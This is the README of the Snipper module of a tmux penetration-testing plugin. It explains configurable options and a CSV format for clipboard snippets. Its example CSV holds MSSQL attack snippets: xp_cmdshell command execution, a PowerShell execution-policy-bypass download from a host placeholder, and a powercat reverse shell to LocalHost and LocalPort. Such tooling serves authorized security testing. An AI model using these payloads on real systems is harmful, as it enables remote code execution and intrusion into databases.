# Snipper Module

This module is providing an interface to copy snippets to the clipboard which can use various penmux options (not restricted to this module) as paramters, flags, etc. so that you don't have to mess around with boring stuff.

It can be extended by csv files with new snippets as you like and has some dumb replacement parser to use dynamic values from penmux options, etc.

## 1. Keytable

Not implemented.

## 2. Options

The following configurable options are used by the Commander module.

| Option | Type | Default | Description |
|--------|------|---------|-------------|
|SnippetSearchPath | String | $HOME/.tmux/plugins/tmux-penmux/modules/auxiliary/Snipper/snippets | The search path for csv files providing snippets |
|ClipboardCommand | String | echo '\$\$snippet\$\$' | xclip -i -sel c | The command used to copy the snippet to the clipboard. The placeholder `'$$snippet$$'` will be replaced by the selected snippet |
|LocalHost | String | 127.0.0.1 | An option used by various commands. Can be seen like metasploit's LHOST |
|LocalPort | Integer | 4444 | An option used by various commands. Can be seen like metasploit's LPORT |

## 3. Adding snippets

You can extend the Snipper with snippets to your like. Either by extending existing csv files or creating new ones. The module is loading any csv or sh file from the 'SnippetSearchPath' recursively so that they can be grouped by using nested directories.

**If you're adding any snippets, please create an issue / pr so that others can benefit from**

### Needed files

For a new group of snippets, you need to create two files (csv and desc) under any sub folder inside the 'SnippetSearchPath' directory.
It has an empty custom folder that should be used for custom snippets and is not included in the git source.

Follow these steps to create a new snippet group (default configuration):
```
mkdir -p $HOME/.tmux/plugins/tmux-penmux/modules/auxiliary/Snipper/snippets/custom/my/new/group
touch $HOME/.tmux/plugins/tmux-penmux/modules/auxiliary/Snipper/snippets/custom/my/new/group/sub.csv
echo "My sub group provides some cool stuff" $HOME/.tmux/plugins/tmux-penmux/modules/auxiliary/Snipper/snippets/custom/my/new/group/sub.desc
```
The csv format is using just ',' as separator and contains the following columns:
| name | description | snippet | variables |
|------|-------------|---------|-----------|
|Unique name which is shown in the selector | A description of what the snippet is doing | The snippet, which is to be copied | Variables that will be asked to change by the user |

As example checkout the mssql group under 'databases/sql'

mssql.desc (this is the description shown by the selection window):
```
Snippets for mssql related things
```
mssql.csv (this is the csv file containing the snippet definitions):
```
name,description,snippet,variables
MsSQLExecuteCommand,MsSQL comamnd execution via xp_cmdshell,EXEC xp_cmdshell "§§§command§§§",§§§command§whoami§command that should be executed§§§
MsSQLExecuteCommandPsDownload,MsSQL comamnd execution via xp_cmdshell (download file via powershell),EXEC xp_cmdshell "powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile §§§file§§§",§§§file§powercat.ps1§filename to download from host§§§
MsSQLExecuteCommandPsDownloadTemp,MsSQL comamnd execution via xp_cmdshell (download file via powershell to temp),EXEC xp_cmdshell "powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile $env:TEMP\§§§file§§§",§§§file§powercat.ps1§filename to download from host§§§
MsSQLExecutePowercat,MsSQL comamnd execution via xp_cmdshell (powercat connection to host),EXEC xp_cmdshell "powershell -ep bypass -nop . powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
MsSQLExecutePowercatTemp,MsSQL comamnd execution via xp_cmdshell (powercat connection to host in temp),EXEC xp_cmdshell "powershell -ep bypass -nop . $env:TEMP\powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
```

### Braking it down

Let's check out one line to get an idea on what is going on:
```
MsSQLExecuteCommand,MsSQL comamnd execution via xp_cmdshell,EXEC xp_cmdshell "§§§command§§§",§§§command§whoami§command that should be executed§§§
```
- The first part `MsSQLExecuteCommand` is just the selector name shown to the user.
- The second part `MsSQL comamnd execution via xp_cmdshell` is just the description of what the snippet will do shown to the user.
- The third part `EXEC xp_cmdshell "§§§command§§§"` is the snippet that will be copied to the clipboard. It can use any placeholders that will be replaced like `###SessionDir###`. Further it has it's own replacements like `§§§command§§§` that are variables for the Snipper only and are automatically asked to change by the user.
- The last part `§§§command§whoami§command that should be executed§§§` are the variables used by the snippet. This format is specific to the Snipper and described [here](#snipper_var_format).

### <a name="#snipper_var_format"></a>Snipper variables format

**TODO**

### Replacement / Expanding

For detailed information of what can be added as dynamic values please refer to [String replacements](../misc/Replacements.md)

## 4. Development information

**TODO**
